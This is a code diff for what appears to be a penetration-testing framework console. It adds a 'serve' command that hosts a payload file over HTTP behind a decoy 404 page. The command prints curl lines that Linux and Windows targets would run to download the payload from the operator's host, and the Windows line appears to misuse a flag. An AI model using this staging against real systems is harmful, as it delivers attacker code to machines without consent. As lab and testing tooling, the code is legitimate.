@@ -58,6 +58,7 @@ class FrameworkConsole(cmd.Cmd):
         self._spool_path: Optional[str] = None
         self._spool_file = None
         self._labs_started: set = set()  # labs started by THIS session
+        self._serve_httpd = None  # (httpd, staging_dir, port) when serving
         self.history_file = history_file
         if history_file is not None:
             self._load_history()
@@ -885,6 +886,71 @@ class FrameworkConsole(cmd.Cmd):
                 output.print_warning(f"Could not tear down lab '{name}': {e}")
         self._labs_started.clear()
 
+    def do_serve(self, arg: str) -> None:
+        """Host a payload over HTTP: serve <file> [port] · serve off
+
+        The file is staged alone in a temp dir behind a 404 index page —
+        the server root shows a bare 404, not a directory listing of your
+        tooling. Fetch lines for linux and windows targets are printed.
+        """
+        import functools
+        import http.server
+        import os
+        import shutil
+        import tempfile
+        import threading
+        from urllib.parse import quote as urlquote
+
+        parts = self._split(arg)
+        if parts is None:
+            return
+        if parts and parts[0].lower() in ("off", "stop"):
+            if self._serve_httpd is None:
+                output.print_error("Nothing is being served")
+                return
+            httpd, staging, port = self._serve_httpd
+            httpd.shutdown()
+            shutil.rmtree(staging, ignore_errors=True)
+            self._serve_httpd = None
+            output.print_status(f"Server on :{port} stopped")
+            return
+        if self._serve_httpd is not None:
+            output.print_error("Already serving — 'serve off' first")
+            return
+        if not parts:
+            output.print_error("Usage: serve <file> [port] · serve off")
+            return
+        src = os.path.expanduser(parts[0])
+        if not os.path.isfile(src):
+            output.print_error(f"No such file: {src}")
+            return
+        port = int(parts[1]) if len(parts) > 1 else 8000
+
+        # stage: 404 page FIRST (a payload named index.html can't
+        # write-through), then the lone symlink
+        staging = tempfile.mkdtemp(prefix="forge-serve-")
+        not_found = ("<!doctype html><title>404 Not Found</title>"
+                     "<h1>404 Not Found</h1>")
+        with open(os.path.join(staging, "index.html"), "w") as f:
+            f.write(not_found)
+        name = os.path.basename(src)
+        os.symlink(os.path.abspath(src), os.path.join(staging, name))
+
+        handler = functools.partial(
+            http.server.SimpleHTTPRequestHandler, directory=staging)
+        httpd = http.server.ThreadingHTTPServer(("0.0.0.0", port), handler)
+        httpd.daemon_threads = True
+        threading.Thread(target=httpd.serve_forever, daemon=True).start()
+        self._serve_httpd = (httpd, staging, port)
+
+        from core.netutil import detect_local_ip, psq
+        lhost = self.global_options.get("LHOST") or detect_local_ip()
+        url = f"http://{lhost}:{port}/{urlquote(name)}"
+        output.print_good(f"serving {src} on :{port} (root answers 404)")
+        output.print_line(f"  linux:   curl -fsSL {url} -o /tmp/{name}")
+        output.print_line(f"  windows: curl.exe -fsSL {url} -OutFile {psq(name)}")
+        output.print_line("  'serve off' to stop")
+
     def do_exit(self, arg: str) -> bool:
         """Exit the framework."""
         running = self.jobs.running()
@@ -893,6 +959,12 @@ class FrameworkConsole(cmd.Cmd):
                 f"{len(running)} job(s) still running; they will be abandoned"
             )
         self._shutdown_labs()
+        if self._serve_httpd is not None:
+            httpd, staging, _ = self._serve_httpd
+            httpd.shutdown()
+            import shutil
+            shutil.rmtree(staging, ignore_errors=True)
+            self._serve_httpd = None
         self._close_spool()
         return True
 
